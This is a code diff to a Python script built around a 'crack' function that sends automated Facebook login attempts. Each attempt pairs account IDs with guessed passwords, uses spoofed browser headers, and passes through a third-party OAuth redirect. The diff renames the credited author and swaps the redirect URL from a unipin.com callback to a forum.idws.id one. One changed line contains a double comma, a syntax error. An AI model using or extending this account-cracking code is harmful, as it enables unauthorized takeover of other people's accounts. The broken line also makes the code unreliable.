@@ -34,7 +34,7 @@ def logo():
  |  \| |  _|  \  /  | |    |  _ \| |     / _ \ | | | |  _|
  | |\  | |___ /  \  | |    | |_) | |___ / ___ \| |_| | |___
  |_| \_|_____/_/\_\ |_|    |____/|_____/_/   \_\____/|_____|
- script by {kk}Niammi{P}, version {kk}premium{P} limited user""")
+ script by {kk}Pixi{P}, version {kk}premium{P} limited user""")
 
 			
 ###---[ USER BARU ]---###
@@ -589,8 +589,8 @@ def crack(idf,pwx,url,awal):
 				"accept-encoding":"gzip, deflate br",
 				"accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
 				}
-			link = ses.get(f'https://{url}/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fwww.facebook.com%2Fv3.0%2Fdialog%2Foauth%3Fclient_id%3D1247593455251878%26redirect_uri%3Dhttps%253A%252F%252Fwww.unipin.com%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DHhAqTA6Kt2PhUnFjq8sBiRwVuGjS2sk6WiTvltEA%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D850fbda2-7c15-44d1-a322-ce13588bf858%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.unipin.com%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DHhAqTA6Kt2PhUnFjq8sBiRwVuGjS2sk6WiTvltEA%23_%3D_&display=page&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr', headers=hd1)
-			date = {"lsd":re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),"email":idf,"pass":pw}
+			link = ses.get(f'https://{url}/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fwww.facebook.com%2Fv2.4%2Fdialog%2Foauth%3Fclient_id%3D1013557125334052%26scope%3Dpublic_profile%252Cemail%26state%3De12b861b245ccac0019b243452b1024e%26redirect_uri%3Dhttps%253A%252F%252Fforum.idws.id%252Fregister%252Ffacebook%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da2754886-c922-4fd7-88de-278f256a33a5%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fforum.idws.id%2Fregister%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3De12b861b245ccac0019b243452b1024e%23_%3D_&display=page&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr', headers=hd1)
+			date = {"lsd":re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),"email":idf,,"next":"https://www.facebook.com/v2.4/dialog/oauth?client_id=1013557125334052&scope=public_profile,email&state=e97b0ddc1d28aa5ae736998a63ce9ed7&tp=unspecified","flow":"login_no_pin","pass":pw}
 			hd2 = {"Host":url,
 				"cache-control":"max-age=0",
 				"upgrade-insecure-requests":"1",
@@ -602,7 +602,7 @@ def crack(idf,pwx,url,awal):
 				"sec-fetch-site":"same-origin","sec-fetch-mode":"cors",
 				"sec-fetch-user":"empty",
 				"sec-fetch-dest":"document",
-				'referer':f'https://{url}/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fwww.facebook.com%2Fv3.0%2Fdialog%2Foauth%3Fclient_id%3D1247593455251878%26redirect_uri%3Dhttps%253A%252F%252Fwww.unipin.com%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DHhAqTA6Kt2PhUnFjq8sBiRwVuGjS2sk6WiTvltEA%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D850fbda2-7c15-44d1-a322-ce13588bf858%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.unipin.com%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DHhAqTA6Kt2PhUnFjq8sBiRwVuGjS2sk6WiTvltEA%23_%3D_&display=page&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
+				'referer':f'https://{url}/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fwww.facebook.com%2Fv2.4%2Fdialog%2Foauth%3Fclient_id%3D1013557125334052%26scope%3Dpublic_profile%252Cemail%26state%3De12b861b245ccac0019b243452b1024e%26redirect_uri%3Dhttps%253A%252F%252Fforum.idws.id%252Fregister%252Ffacebook%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da2754886-c922-4fd7-88de-278f256a33a5%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fforum.idws.id%2Fregister%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3De12b861b245ccac0019b243452b1024e%23_%3D_&display=page&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
 				"accept-encoding":"gzip, deflate br",
 				"accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
 				}
